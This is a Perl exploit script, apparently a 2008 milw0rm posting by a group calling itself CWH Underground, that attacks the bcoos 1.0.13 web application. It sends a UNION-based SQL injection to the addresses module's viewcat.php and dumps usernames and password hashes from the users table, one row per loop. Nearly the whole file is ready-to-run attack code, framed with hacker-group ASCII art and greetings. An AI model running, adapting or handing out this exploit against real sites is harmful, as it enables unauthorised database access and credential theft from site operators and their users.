#!/usr/bin/perl -w
#============================================
# bcoos 1.0.13 Remote SQL Injection Exploit
#============================================
#
#  ,--^----------,--------,-----,-------^--,
#  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#    `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 1 December 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : bcoos 
#VERSION	 : 1.0.13 (Prior versions also maybe affected)
#VENDOR		 : http://www.bcoos.net/
#DOWNLOAD    : http://www.bcoos.net/modules/mydownloads/cache/files/bcoos1.0.13.zip
######################################################
#
#Note: magic_quotes_gpc = off
#Addresses Modules Must be Installed
#
#######################################################################################
#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################


use LWP::UserAgent;
use HTTP::Request;

if ($#ARGV+1 != 2)
{
   print "\n==============================================\n";
   print "      Bcoos Remote SQL Injection Exploit   \n";
   print "                                              \n";
   print "        Discovered By CWH Underground         \n";
   print "==============================================\n";
   print "                                              \n";
   print "  ,--^----------,--------,-----,-------^--,   \n";
   print "  | |||||||||   `--------'     |          O	\n";
   print "  `+---------------------------^----------|   \n";
   print "    `\_,-------, _________________________|   \n";
   print "      / XXXXXX /`|     /                      \n";
   print "     / XXXXXX /  `\   /                       \n";
   print "    / XXXXXX /\______(                        \n";
   print "   / XXXXXX /                                 \n";
   print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
   print " (________(                                   \n";
   print "  `------'                                    \n";
   print "                                              \n"; 
   print "Usage  : ./xpl.pl <Target> <Data Limit>\n";
   print "Example: ./xpl.pl http://www.target.com/bcoos 10\n";
   exit();
}

$target  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
$number = $ARGV[1];

print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++";
print "\n  ..:: SQL Injection Exploit By CWH Underground ::.. ";
print "\n++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
print "\n[+]Dump Username and Password\n";

for ($start=0;$start<$number;$start++) {

$xpl = LWP::UserAgent->new() or die "Could not initialize browser\n";
$req = HTTP::Request->new(GET => $target."/modules/adresses/viewcat.php?cid=1%27%20and%201=2%20union%20select%201,concat(0x3a3a3a,uname,0x3a3a,pass,0x3a3a3a)%20from%20bcoos_users%20limit%201%20offset%20".$start."--+and+1=1")or die "Failed to Connect, Try again!\n";
$res = $xpl->request($req);
$info = $res->content;
$count=$start+1;

if ($info =~ /:::(.+):::/)
{
$dump=$1;
($username,$password)= split('::',$dump);
printf "\n [$count]\n [!]Username = $username \n [!]Password = $password\n";
}
else { 
	print "\n [*]Exploit Done !!" or die "\n [*]Exploit Failed !!\n";
	exit;
}
}

# milw0rm.com [2008-12-01]
